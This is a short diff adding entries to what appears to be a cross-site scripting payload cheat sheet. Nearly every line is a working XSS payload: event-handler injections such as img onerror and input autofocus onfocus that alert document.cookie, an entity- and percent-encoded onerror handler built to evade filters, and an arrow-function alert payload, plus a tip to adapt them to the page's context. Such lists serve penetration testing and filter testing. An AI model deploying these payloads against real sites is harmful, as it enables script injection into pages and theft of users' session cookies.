@@ -6,3 +6,11 @@
 <img src=1 onerror=alert(1)>
 <xss autofocus onfocus=alert(document.cookie) tabindex=1>
 "onmouseover="alert(1)
+
+Between HTML tags:
+<input autofocus onfocus=alert(document.cookie)>
+<img/src/onerror="%26%23%78%32%38%3b%26%23%78%36%32%3b%26%23%78%33%32%3b%26%23%78%36%32%3b%26%23%78%36%38%3b%26%23%78%33%64%3b%26%23%78%33%65%3b%26%23%78%36%31%3b%26%23%78%36%63%3b%26%23%78%36%35%3b%26%23%78%37%32%3b%26%23%78%37%34%3b%26%23%78%36%30%3b%26%23%78%36%30%3b%26%23%78%32%39%3b%26%23%78%32%38%3b%26%23%78%32%39%3b">
+
+
+Check the context and modify it to suite the context
+(b2bh=>alert``)()
